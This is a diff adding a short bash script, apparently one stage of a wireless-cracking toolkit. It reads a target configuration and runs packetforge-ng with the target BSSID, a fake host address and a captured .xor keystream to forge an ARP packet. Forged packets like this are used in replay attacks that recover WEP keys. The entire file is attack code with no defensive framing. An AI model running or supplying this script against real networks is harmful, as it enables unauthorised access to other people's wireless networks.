@@ -1,0 +1,16 @@
+#!/bin/bash
+
+if [ -f ../../cfg/target.conf ]; then
+	. ../../cfg/target.conf
+else
+	echo "Error: No target set!"
+	exit 1
+fi
+
+. ../../cfg/hardware.conf
+
+DESTIP=255.255.255.255
+SRCIP=255.255.255.255
+
+echo "Attempting to forge a packet and store it to /tmp/fake-arp..."
+packetforge-ng -0 -a $BSSID -h $FAKE_HOST -k $DESTIP -l $SRCIP -y `ls $PWD | grep '.xor'` -w /tmp/fake-arp
